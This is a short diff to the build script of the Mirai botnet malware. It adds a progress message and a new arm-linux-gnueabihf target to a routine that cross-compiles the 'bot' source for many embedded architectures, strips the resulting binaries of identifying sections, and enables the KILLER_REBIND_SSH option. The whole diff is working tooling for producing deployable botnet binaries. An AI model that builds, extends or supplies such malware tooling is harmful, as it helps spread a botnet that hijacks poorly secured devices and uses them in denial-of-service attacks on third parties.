@@ -3,6 +3,7 @@
 FLAGS=""
 
 function compile_bot {
+    echo "Compiling $2"
     "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
     "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
 }
@@ -30,6 +31,7 @@ elif [ "$1" == "release" ]; then
     compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
     compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
+    compile_bot arm-linux-gnueabihf mirai.gnueabihf "$FLAGS -DKILLER_REBIND_SSH -static -Wno-unused-result"
     compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
